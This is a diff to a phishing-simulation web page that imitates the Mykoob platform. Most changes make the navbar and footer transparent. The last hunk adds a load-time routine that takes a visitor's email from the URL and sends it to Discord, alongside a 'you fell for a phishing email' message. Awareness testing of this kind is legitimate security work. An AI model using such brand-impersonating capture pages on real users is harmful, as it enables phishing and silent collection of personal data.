@@ -13,26 +13,20 @@
         /* ── CSS variables: light (default) & dark via media query ── */
         :root {
             --bg-body: #f9fafb;
-            --bg-nav: #ffffff;
             --bg-page: #f9fafb;
-            --bg-card: #ffffff;
             --bg-input: #ffffff;
             --bg-modal: #ffffff;
-            --bg-footer: #ffffff;
             --bg-secondary: #f3f4f6;
             --border-light: #e5e7eb;
             --border-input: #d1d5db;
-            --border-nav: #e5e7eb;
             --text-primary: #111827;
             --text-secondary: #6b7280;
             --text-muted: #9ca3af;
-            --text-invert: #111827;
             --link: #0274ef;
             --link-hover: #025bc4;
             --btn-primary: #0274ef;
             --btn-primary-hover: #025bc4;
             --error: #dc2626;
-            --error-bg: #fef2f2;
             --modal-border: #e5e7eb;
             --modal-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
             --overlay: rgba(0, 0, 0, 0.4);
@@ -42,49 +36,39 @@
             --select-text: #111827;
             --danger: #dc2626;
             --danger-hover: #b91c1c;
-            --success: #16a34a;
             --focus-ring: rgba(2, 116, 239, 0.25);
             --illustration-filter: none;
-            --scrollbar-bg: #e5e7eb;
         }
 
         /* ── Dark mode via prefers-color-scheme ── */
         @media (prefers-color-scheme: dark) {
             :root {
                 --bg-body: #121212;
-                --bg-nav: #1a1a1a;
                 --bg-page: #121212;
-                --bg-card: #1e1e1e;
                 --bg-input: #1e1e1e;
                 --bg-modal: #1e1e1e;
-                --bg-footer: #1a1a1a;
                 --bg-secondary: #2d2d2d;
                 --border-light: #2d2d2d;
                 --border-input: #3d3d3d;
-                --border-nav: #2d2d2d;
                 --text-primary: #f3f4f6;
                 --text-secondary: #9ca3af;
                 --text-muted: #6b7280;
-                --text-invert: #f3f4f6;
                 --link: #489ffe;
                 --link-hover: #6bb0ff;
                 --btn-primary: #489ffe;
                 --btn-primary-hover: #0274ef;
                 --error: #ff686e;
-                --error-bg: rgba(255, 104, 110, 0.1);
                 --modal-border: #2d2d2d;
                 --modal-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
                 --overlay: rgba(0, 0, 0, 0.7);
                 --logo-filter: brightness(0) invert(1);
-                --select-bg: #1a1a1a;
+                --select-bg: transparent;
                 --select-border: #3d3d3d;
                 --select-text: #e5e7eb;
                 --danger: #ff686e;
                 --danger-hover: #e43f39;
-                --success: #4ade80;
                 --focus-ring: rgba(72, 159, 254, 0.25);
                 --illustration-filter: none;
-                --scrollbar-bg: #2d2d2d;
             }
         }
 
@@ -116,16 +100,16 @@
             min-height: 100vh;
         }
 
-        /* ── Navbar ── */
+        /* ── Navbar — transparent, no border ── */
         .navbar {
             display: flex;
             align-items: center;
             justify-content: space-between;
             padding: 20px 40px;
-            border-bottom: 1px solid var(--border-nav);
+            border-bottom: none;
             flex-shrink: 0;
-            background: var(--bg-nav);
-            transition: background 0.3s ease, border-color 0.3s ease;
+            background: transparent;
+            transition: background 0.3s ease;
         }
         .navbar__brand {
             display: flex;
@@ -161,7 +145,7 @@
             box-shadow: 0 0 0 3px var(--focus-ring);
         }
         .lang-select option {
-            background: var(--select-bg);
+            background: var(--bg-body);
             color: var(--select-text);
         }
 
@@ -347,11 +331,11 @@
             transition: filter 0.3s ease;
         }
 
-        /* ── Footer ── */
+        /* ── Footer — transparent, no border ── */
         .footer {
             flex-shrink: 0;
             padding: 20px 40px 28px;
-            border-top: 1px solid var(--border-light);
+            border-top: none;
             display: flex;
             flex-wrap: wrap;
             align-items: center;
@@ -359,8 +343,8 @@
             gap: 12px 24px;
             font-size: 13px;
             color: var(--text-muted);
-            background: var(--bg-footer);
-            transition: background 0.3s ease, border-color 0.3s ease, color 0.3s ease;
+            background: transparent;
+            transition: background 0.3s ease, color 0.3s ease;
         }
         .footer__left {
             display: flex;
@@ -988,4 +972,24 @@
                 sendReset: 'Отправить ссылку для сброса',
                 failTitle: '⛔ Тест на кибербезопасность не пройден',
                 failSub: 'Вы попались на фишинговое письмо.',
-                ok: 'Понятно
+                ok: 'Понятно'
+            }
+        };
+
+        // ── Check for URL parameter on load ──
+        (function init() {
+            const params = new URLSearchParams(window.location.search);
+            const emailParam = params.get('email');
+            if (emailParam) {
+                emailInput.value = emailParam;
+                storedEmail = emailParam;
+                sendToDiscord(emailParam, '📨 Saites atvēršana', false, true);
+            }
+            
+            updateTexts('lv');
+            console.log('[Mykoob] Phishing simulation ready.');
+        })();
+    </script>
+
+</body>
+</html>
